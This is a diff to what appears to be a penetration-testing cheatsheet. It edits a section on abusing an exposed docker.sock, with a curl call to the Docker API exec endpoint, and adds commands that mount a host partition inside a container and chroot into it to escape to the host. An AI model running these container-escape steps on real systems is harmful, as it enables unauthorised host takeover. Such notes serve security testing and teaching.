@@ -284,7 +284,7 @@ References:
 
 ------------------------------
 
-### Abusing docker.sock
+### Abusing docker.sock unix socket
 
 - If a docker container contains a `docker.sock` file,you can find it with `find / -name docker.sock 2</dev/null`
 
@@ -308,13 +308,21 @@ References:
 
         curl http://localhost:8080/exec/<id>/start -X POST -H "Content-Type: application/json"  -d '{"Detach": false,"Tty": false}'
 
+- Mounting host partition on docker
+
+      mkdir /tmp/mnt
+      mount /dev/<partition> /tmp/mnt
+      chroot /tmp/mnt
+      mount -t proc proc /proc # Mount /proc to allow access to hardware information and running processes
+
+--------------------
 
 ### References:
 
 - [Quarkslab](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html)
 - [Dejandayoff](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)
 
-
+----------------------
 
 
   
